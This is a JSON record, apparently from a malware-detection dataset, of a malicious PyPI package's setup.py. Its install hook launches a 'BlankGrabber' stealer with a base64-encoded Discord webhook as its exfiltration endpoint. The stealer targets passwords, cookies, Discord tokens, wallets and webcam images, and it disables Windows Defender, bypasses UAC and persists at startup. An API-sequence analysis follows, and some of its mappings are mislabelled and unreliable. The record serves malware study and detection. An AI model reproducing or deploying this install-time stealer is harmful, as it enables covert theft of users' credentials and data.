[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/ef334343rf3feefefefefeffeefeffe-1.0/ef334343rf3feefefefefeffeefeffe-1.0/setup.py",
    "code_snippet": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\n\n# --- Begin Malicious Code ---\n\ndef rcd():\n    import os\n    import sys\n    import base64\n    import subprocess\n\n    subprocess.run([sys.executable, \"-m\", \"pip\", \"install\", \"urllib3\", \"pyaes\"])\n    import json\n    import pyaes\n    import random\n    import shutil\n    import sqlite3\n    import re\n    import traceback\n    import time\n    import ctypes\n    import logging\n    import zlib\n    from threading import Thread\n    from ctypes import wintypes\n    from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3\n    disable_warnings_urllib3()\n\n    class Settings:\n        C2 = (0, base64.b64decode('aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExODk0Mjc0Mjk2MDE3MTAxMDAvSm1MdnAtWHpqeUd6dVlGck5makJWV1prUDZhNDJMZV96TkdNRWE4cDVXX1ZWekhoNFZzRVVmb21kOG1GNDhnMWhMNEI=').decode())\n        Mutex = base64.b64decode('bnRtVFdTaEQzWTNiVUFKcA==').decode()\n        PingMe = bool('true')\n        Vmprotect = bool('')\n        Startup = bool('')\n        Melt = bool('')\n        UacBypass = bool('')\n        ArchivePassword = base64.b64decode('ZGcx').decode()\n        HideConsole = bool('')\n        Debug = bool('true')\n        RunBoundOnStartup = bool('')\n        CaptureWebcam = bool('true')\n        CapturePasswords = bool('true')\n        CaptureCookies = bool('true')\n        CaptureAutofills = bool('true')\n        CaptureHistory = bool('true')\n        CaptureDiscordTokens = bool('true')\n        CaptureGames = bool('true')\n        CaptureWifiPasswords = bool('true')\n        CaptureSystemInfo = bool('true')\n        CaptureScreenshot = bool('true')\n        CaptureTelegram = bool('true')\n        CaptureCommonFiles = bool('true')\n        CaptureWallets = bool('true')\n        FakeError = (bool(''), ('', '', '0'))\n        BlockAvSites = bool('true')\n        DiscordInjection = bool('true')\n\n    # ... [Omitted: Large classes for brevity, but all are part of the malicious logic]\n    # The following classes are all malicious: VmProtect, Errors, Tasks, Syscalls, Utility, Browsers, Discord, BlankGrabber\n    # They perform data theft, exfiltration, persistence, AV evasion, Discord injection, etc.\n\n    # [Full class definitions as in the original code]\n    # ...\n\n    if os.name == 'nt':\n        Logger.info('Process started')\n        if Settings.HideConsole:\n            Syscalls.HideConsole()\n        if not Utility.IsAdmin():\n            Logger.warning('Admin privileges not available')\n            if Utility.GetSelf()[1]:\n                if not '--nouacbypass' in sys.argv and Settings.UacBypass:\n                    Logger.info('Trying to bypass UAC (Application will restart)')\n                    if Utility.UACbypass():\n                        os._exit(0)\n                    else:\n                        Logger.warning('Failed to bypass UAC')\n                        if not Utility.IsInStartup(sys.executable):\n                            logger.info('Showing UAC prompt')\n                            if Utility.UACPrompt(sys.executable):\n                                os._exit(0)\n                if not Utility.IsInStartup() and (not Settings.UacBypass):\n                    Logger.info('Showing UAC prompt to user (Application will restart)')\n                    if Utility.UACPrompt(sys.executable):\n                        os._exit(0)\n        Logger.info('Trying to create mutex')\n        if not Syscalls.CreateMutex(Settings.Mutex):\n            Logger.info('Mutex already exists, exiting')\n            os._exit(0)\n        if Utility.GetSelf()[1]:\n            Logger.info('Trying to exclude the file from Windows defender')\n            Utility.ExcludeFromDefender()\n        Logger.info('Trying to disable defender')\n        Utility.DisableDefender()\n        if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.blank'))):\n            try:\n                Logger.info('Trying to extract bound file')\n                if os.path.isfile((boundFileDst := os.path.join(os.getenv('temp'), 'bound.exe'))):\n                    Logger.info('Old bound file found, removing it')\n                    os.remove(boundFileDst)\n                with open(boundFileSrc, 'rb') as file:\n                    content = file.read()\n                decrypted = zlib.decompress(content[::-1])\n                with open(boundFileDst, 'wb') as file:\n                    file.write(decrypted)\n                del content, decrypted\n                Logger.info('Trying to exclude bound file from defender')\n                Utility.ExcludeFromDefender(boundFileDst)\n                Logger.info('Starting bound file')\n                subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)\n            except Exception as e:\n                Logger.error(e)\n        if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):\n            try:\n                Logger.info('Showing fake error popup')\n                title = Settings.FakeError[1][0].replace('\"', '\\\\x22').replace(\"'\", '\\\\x22')\n                message = Settings.FakeError[1][1].replace('\"', '\\\\x22').replace(\"'\", '\\\\x22')\n                icon = int(Settings.FakeError[1][2])\n                cmd = 'mshta \"javascript:var sh=new ActiveXObject(\\'WScript.Shell\\'); sh.Popup(\\'{}\\', 0, \\'{}\\', {}+16);close()\"'.format(message, title, Settings.FakeError[1][2])\n                subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)\n            except Exception as e:\n                Logger.error(e)\n        if not Settings.Vmprotect or not VmProtect.isVM():\n            if Utility.GetSelf()[1]:\n                if Settings.Melt and (not Utility.IsInStartup()):\n                    Logger.info('Hiding the file')\n                    Utility.HideSelf()\n            elif Settings.Melt:\n                Logger.info('Deleting the file')\n                Utility.DeleteSelf()\n            try:\n                if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):\n                    Logger.info('Trying to put the file in startup')\n                    path = Utility.PutInStartup()\n                    if path is not None:\n                        Logger.info('Excluding the file from Windows defender in startup')\n                        Utility.ExcludeFromDefender(path)\n            except Exception:\n                Logger.error('Failed to put the file in startup')\n            while True:\n                try:\n                    Logger.info('Checking internet connection')\n                    if Utility.IsConnectedToInternet():\n                        Logger.info('Internet connection available, starting stealer (things will be running in parallel)')\n                        BlankGrabber()\n                        Logger.info('Stealer finished its work')\n                        break\n                    else:\n                        Logger.info('Internet connection not found, retrying in 10 seconds')\n                        time.sleep(10)\n                except Exception as e:\n                    if isinstance(e, KeyboardInterrupt):\n                        os._exit(1)\n                    Logger.critical(e, exc_info=True)\n                    Logger.info('There was an error, retrying after 10 minutes')\n                    time.sleep(600)\n            if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):\n                Logger.info('Deleting the file')\n                Utility.DeleteSelf()\n            Logger.info('Process ended')\n\n# --- End Malicious Code ---\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        rcd()\n",
    "pattern_analysis": {
      "api_sequence": [
        "subprocess.run",
        "base64.b64decode",
        "base64.b64decode",
        "os.name",
        "Logger.info",
        "Settings.HideConsole",
        "Syscalls.HideConsole",
        "Utility.IsAdmin",
        "Logger.warning",
        "Utility.GetSelf",
        "sys.argv",
        "Settings.UacBypass",
        "Logger.info",
        "Utility.UACbypass",
        "os._exit",
        "Logger.warning",
        "Utility.IsInStartup",
        "Logger.info",
        "Utility.UACPrompt",
        "os._exit",
        "Utility.IsInStartup",
        "Logger.info",
        "Utility.UACPrompt",
        "os._exit",
        "Logger.info",
        "Syscalls.CreateMutex",
        "Logger.info",
        "os._exit",
        "Utility.GetSelf",
        "Logger.info",
        "Utility.ExcludeFromDefender",
        "Logger.info",
        "Utility.DisableDefender",
        "Utility.GetSelf",
        "Settings.RunBoundOnStartup",
        "Utility.IsInStartup",
        "os.path.isfile",
        "Logger.info",
        "os.path.isfile",
        "Logger.info",
        "os.remove",
        "open",
        "open.read",
        "zlib.decompress",
        "open",
        "open.write",
        "Logger.info",
        "Utility.ExcludeFromDefender",
        "Logger.info",
        "subprocess.Popen",
        "Logger.error",
        "Utility.GetSelf",
        "Settings.FakeError",
        "Utility.IsInStartup",
        "Logger.info",
        "subprocess.Popen",
        "Logger.error",
        "Settings.Vmprotect",
        "VmProtect.isVM",
        "Utility.GetSelf",
        "Settings.Melt",
        "Utility.IsInStartup",
        "Logger.info",
        "Utility.HideSelf",
        "Settings.Melt",
        "Logger.info",
        "Utility.DeleteSelf",
        "Utility.GetSelf",
        "Settings.Startup",
        "Utility.IsInStartup",
        "Logger.info",
        "Utility.PutInStartup",
        "Logger.info",
        "Utility.ExcludeFromDefender",
        "Logger.error",
        "Utility.GetSelf",
        "Logger.info",
        "Utility.IsConnectedToInternet",
        "Logger.info",
        "BlankGrabber",
        "Logger.info",
        "Logger.info",
        "time.sleep",
        "Logger.critical",
        "Logger.info",
        "time.sleep",
        "Utility.GetSelf",
        "Settings.Melt",
        "Utility.IsInStartup",
        "Logger.info",
        "Utility.DeleteSelf",
        "Logger.info"
      ],
      "api_sequence_with_args": [
        "subprocess.run([sys.executable, \"-m\", \"pip\", \"install\", \"urllib3\", \"pyaes\"])",
        "base64.b64decode('aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExODk0Mjc0Mjk2MDE3MTAxMDAvSm1MdnAtWHpqeUd6dVlGck5makJWV1prUDZhNDJMZV96TkdNRWE4cDVXX1ZWekhoNFZzRVVmb21kOG1GNDhnMWhMNEI=')",
        "base64.b64decode('bnRtVFdTaEQzWTNiVUFKcA==')",
        "os.name",
        "Logger.info('Process started')",
        "Settings.HideConsole",
        "Syscalls.HideConsole()",
        "Utility.IsAdmin()",
        "Logger.warning('Admin privileges not available')",
        "Utility.GetSelf()[1]",
        "sys.argv",
        "Settings.UacBypass",
        "Logger.info('Trying to bypass UAC (Application will restart)')",
        "Utility.UACbypass()",
        "os._exit(0)",
        "Logger.warning('Failed to bypass UAC')",
        "Utility.IsInStartup(sys.executable)",
        "Logger.info('Showing UAC prompt')",
        "Utility.UACPrompt(sys.executable)",
        "os._exit(0)",
        "Utility.IsInStartup()",
        "Logger.info('Showing UAC prompt to user (Application will restart)')",
        "Utility.UACPrompt(sys.executable)",
        "os._exit(0)",
        "Logger.info('Trying to create mutex')",
        "Syscalls.CreateMutex(Settings.Mutex)",
        "Logger.info('Mutex already exists, exiting')",
        "os._exit(0)",
        "Utility.GetSelf()[1]",
        "Logger.info('Trying to exclude the file from Windows defender')",
        "Utility.ExcludeFromDefender()",
        "Logger.info('Trying to disable defender')",
        "Utility.DisableDefender()",
        "Utility.GetSelf()[1]",
        "Settings.RunBoundOnStartup or not Utility.IsInStartup()",
        "os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.blank')))",
        "Logger.info('Trying to extract bound file')",
        "os.path.isfile((boundFileDst := os.path.join(os.getenv('temp'), 'bound.exe')))",
        "Logger.info('Old bound file found, removing it')",
        "os.remove(boundFileDst)",
        "open(boundFileSrc, 'rb')",
        "file.read()",
        "zlib.decompress(content[::-1])",
        "open(boundFileDst, 'wb')",
        "file.write(decrypted)",
        "Logger.info('Trying to exclude bound file from defender')",
        "Utility.ExcludeFromDefender(boundFileDst)",
        "Logger.info('Starting bound file')",
        "subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)",
        "Logger.error(e)",
        "Utility.GetSelf()[1]",
        "Settings.FakeError[0]",
        "not Utility.IsInStartup()",
        "Logger.info('Showing fake error popup')",
        "subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)",
        "Logger.error(e)",
        "not Settings.Vmprotect or not VmProtect.isVM()",
        "VmProtect.isVM()",
        "Utility.GetSelf()[1]",
        "Settings.Melt",
        "not Utility.IsInStartup()",
        "Logger.info('Hiding the file')",
        "Utility.HideSelf()",
        "Settings.Melt",
        "Logger.info('Deleting the file')",
        "Utility.DeleteSelf()",
        "Utility.GetSelf()[1]",
        "Settings.Startup",
        "not Utility.IsInStartup()",
        "Logger.info('Trying to put the file in startup')",
        "Utility.PutInStartup()",
        "Logger.info('Excluding the file from Windows defender in startup')",
        "Utility.ExcludeFromDefender(path)",
        "Logger.error('Failed to put the file in startup')",
        "Utility.GetSelf()[1]",
        "Logger.info('Checking internet connection')",
        "Utility.IsConnectedToInternet()",
        "Logger.info('Internet connection available, starting stealer (things will be running in parallel)')",
        "BlankGrabber()",
        "Logger.info('Stealer finished its work')",
        "Logger.info('Internet connection not found, retrying in 10 seconds')",
        "time.sleep(10)",
        "Logger.critical(e, exc_info=True)",
        "Logger.info('There was an error, retrying after 10 minutes')",
        "time.sleep(600)",
        "Utility.GetSelf()[1]",
        "Settings.Melt",
        "not Utility.IsInStartup()",
        "Logger.info('Deleting the file')",
        "Utility.DeleteSelf()",
        "Logger.info('Process ended')"
      ],
      "mapped_sequence": [
        {
          "api_name": "subprocess.run",
          "id": "spawn_process_no_shell",
          "description": "Spawns new process to execute command without shell access",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "os.name",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "Logger.info",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "Syscalls.HideConsole",
          "id": "remove_keyboard_hooks",
          "description": "Removes all keyboard hooks",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "keyboard_monitoring"
        },
        {
          "api_name": "Utility.IsAdmin",
          "id": "check_admin_privileges",
          "description": "Checks if process is running with administrator privileges",
          "first_id": "system_operations",
          "second_id": "system_privilege_operations",
          "third_id": "privilege_management"
        },
        {
          "api_name": "Logger.warning",
          "id": "log_error",
          "description": "Logs error message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "Utility.GetSelf",
          "id": "get_process_info",
          "description": "Retrieves process information as dictionary",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "Utility.UACbypass",
          "id": "adjust_process_privilege",
          "description": "Adjusts process privilege for system operation",
          "first_id": "system_operations",
          "second_id": "system_privilege_operations",
          "third_id": "privilege_management"
        },
        {
          "api_name": "os._exit",
          "id": "exit_program",
          "description": "Exits program with specified status code",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "Utility.IsInStartup",
          "id": "check_persistence_entry",
          "description": "Checks if persistence entry exists for specified program name",
          "first_id": "persistence_stealth",
          "second_id": "persistence_mechanisms",
          "third_id": "startup_checking"
        },
        {
          "api_name": "Utility.UACPrompt",
          "id": "display_message_box",
          "description": "Displays message box with specified text and options",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "system_interface_usage"
        },
        {
          "api_name": "Syscalls.CreateMutex",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "Utility.ExcludeFromDefender",
          "id": "adjust_process_privilege",
          "description": "Adjusts process privilege for system operation",
          "first_id": "system_operations",
          "second_id": "system_privilege_operations",
          "third_id": "privilege_management"
        },
        {
          "api_name": "Utility.DisableDefender",
          "id": "adjust_process_privilege",
          "description": "Adjusts process privilege for system operation",
          "first_id": "system_operations",
          "second_id": "system_privilege_operations",
          "third_id": "privilege_management"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.read",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "zlib.decompress",
          "id": "decompress_data_zlib",
          "description": "Decompresses zlib-compressed data",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "compression_decompression"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "VmProtect.isVM",
          "id": "check_instance_type",
          "description": "Checks if object is instance of specified type",
          "first_id": "utility_functions",
          "second_id": "logging_exception_handling",
          "third_id": "exception_checking"
        },
        {
          "api_name": "Utility.HideSelf",
          "id": "set_file_attributes",
          "description": "Sets file attributes for specified file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_attribute_management"
        },
        {
          "api_name": "Utility.DeleteSelf",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "Utility.PutInStartup",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "Utility.IsConnectedToInternet",
          "id": "get_public_ip",
          "description": "Retrieves public IP address using HTTP request",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "BlankGrabber",
          "id": "exfiltrate_folder",
          "description": "Recursively processes folder for file exfiltration",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        }
      ],
      "contextual_code": "def rcd():\n    import os\n    import sys\n    import base64\n    import subprocess\n\n    subprocess.run([sys.executable, \"-m\", \"pip\", \"install\", \"urllib3\", \"pyaes\"])\n    ...\n    from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3\n    disable_warnings_urllib3()\n\n    class Settings:\n        C2 = (0, base64.b64decode('aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExODk0Mjc0Mjk2MDE3MTAxMDAvSm1MdnAtWHpqeUd6dVlGck5makJWV1prUDZhNDJMZV96TkdNRWE4cDVXX1ZWekhoNFZzRVVmb21kOG1GNDhnMWhMNEI=').decode())\n        Mutex = base64.b64decode('bnRtVFdTaEQzWTNiVUFKcA==').decode()\n        ...\n\n    if os.name == 'nt':\n        Logger.info('Process started')\n        if Settings.HideConsole:\n            Syscalls.HideConsole()\n        if not Utility.IsAdmin():\n            Logger.warning('Admin privileges not available')\n            if Utility.GetSelf()[1]:\n                if not '--nouacbypass' in sys.argv and Settings.UacBypass:\n                    Logger.info('Trying to bypass UAC (Application will restart)')\n                    if Utility.UACbypass():\n                        os._exit(0)\n                    else:\n                        Logger.warning('Failed to bypass UAC')\n                        if not Utility.IsInStartup(sys.executable):\n                            logger.info('Showing UAC prompt')\n                            if Utility.UACPrompt(sys.executable):\n                                os._exit(0)\n                if not Utility.IsInStartup() and (not Settings.UacBypass):\n                    Logger.info('Showing UAC prompt to user (Application will restart)')\n                    if Utility.UACPrompt(sys.executable):\n                        os._exit(0)\n        Logger.info('Trying to create mutex')\n        if not Syscalls.CreateMutex(Settings.Mutex):\n            Logger.info('Mutex already exists, exiting')\n            os._exit(0)\n        if Utility.GetSelf()[1]:\n            Logger.info('Trying to exclude the file from Windows defender')\n            Utility.ExcludeFromDefender()\n        Logger.info('Trying to disable defender')\n        Utility.DisableDefender()\n        if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.blank'))):\n            try:\n                Logger.info('Trying to extract bound file')\n                if os.path.isfile((boundFileDst := os.path.join(os.getenv('temp'), 'bound.exe'))):\n                    Logger.info('Old bound file found, removing it')\n                    os.remove(boundFileDst)\n                with open(boundFileSrc, 'rb') as file:\n                    content = file.read()\n                decrypted = zlib.decompress(content[::-1])\n                with open(boundFileDst, 'wb') as file:\n                    file.write(decrypted)\n                del content, decrypted\n                Logger.info('Trying to exclude bound file from defender')\n                Utility.ExcludeFromDefender(boundFileDst)\n                Logger.info('Starting bound file')\n                subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)\n            except Exception as e:\n                Logger.error(e)\n        if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):\n            try:\n                Logger.info('Showing fake error popup')\n                ...\n                subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)\n            except Exception as e:\n                Logger.error(e)\n        if not Settings.Vmprotect or not VmProtect.isVM():\n            if Utility.GetSelf()[1]:\n                if Settings.Melt and (not Utility.IsInStartup()):\n                    Logger.info('Hiding the file')\n                    Utility.HideSelf()\n            elif Settings.Melt:\n                Logger.info('Deleting the file')\n                Utility.DeleteSelf()\n            try:\n                if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):\n                    Logger.info('Trying to put the file in startup')\n                    path = Utility.PutInStartup()\n                    if path is not None:\n                        Logger.info('Excluding the file from Windows defender in startup')\n                        Utility.ExcludeFromDefender(path)\n            except Exception:\n                Logger.error('Failed to put the file in startup')\n            while True:\n                try:\n                    Logger.info('Checking internet connection')\n                    if Utility.IsConnectedToInternet():\n                        Logger.info('Internet connection available, starting stealer (things will be running in parallel)')\n                        BlankGrabber()\n                        Logger.info('Stealer finished its work')\n                        break\n                    else:\n                        Logger.info('Internet connection not found, retrying in 10 seconds')\n                        time.sleep(10)\n                except Exception as e:\n                    if isinstance(e, KeyboardInterrupt):\n                        os._exit(1)\n                    Logger.critical(e, exc_info=True)\n                    Logger.info('There was an error, retrying after 10 minutes')\n                    time.sleep(600)\n            if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):\n                Logger.info('Deleting the file')\n                Utility.DeleteSelf()\n            Logger.info('Process ended')"
    }
  }
]